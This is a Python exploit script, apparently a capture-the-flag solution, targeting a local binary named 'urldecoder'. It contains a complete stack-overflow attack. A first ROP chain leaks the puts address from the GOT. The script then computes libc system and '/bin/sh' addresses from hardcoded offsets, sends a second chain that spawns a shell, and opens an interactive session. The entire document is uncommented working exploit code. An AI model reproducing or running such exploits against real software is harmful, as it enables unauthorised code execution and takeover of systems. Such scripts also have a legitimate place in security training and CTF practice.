from zio import *
import struct

target = "./urldecoder"
def get_io(target):
	io = zio(target, timeout = 99999)
	return io

def decode_buff(data):
	buff = ""
	for i in range(0, len(data)):
		buff += "%" + "%02x"%(ord(data[i]))
	
	return buff

def pwn(io):
	io.read_until("URL: ")

	puts_plt_str = struct.pack("I", 0x08048530)
	puts_got = 0x08049de8
	puts_got_str = struct.pack("I", puts_got)
	pop_ret_str = struct.pack("I", 0x08048489)
	main_str = struct.pack("I", 0x08048590)

	raw_input(":")
	data = "http://%3\x00"
	data += 'c' * (158 - len(data))
	data += puts_plt_str + pop_ret_str + puts_got_str + main_str + "\x00"
	io.write(data + "\n")
	io.read_until("\n")
	data = io.read(4)
	print "len(data):", len(data)

	put_real_addr = struct.unpack("I", data)[0]
	print "put_real_addr:", hex(put_real_addr)

	system_addr = 0x0003E800 + put_real_addr - 0x000656A0 
	system_addr_str = decode_buff(struct.pack("I", system_addr))
	bin_sh_addr = 0x0015F9E4 + put_real_addr - 0x000656A0 
	bin_sh_addr_str = struct.pack("I", bin_sh_addr)

	print "system_addr:", hex(system_addr)
	print "bin_sh_addr:", hex(bin_sh_addr)
	data = "http://%3\x00"
	data += 'c' * (158 - len(data))
	data += system_addr_str + pop_ret_str + bin_sh_addr_str + main_str + "\x00"
	io.write(data + "\n")
	io.interact()


io = get_io(target)
pwn(io)
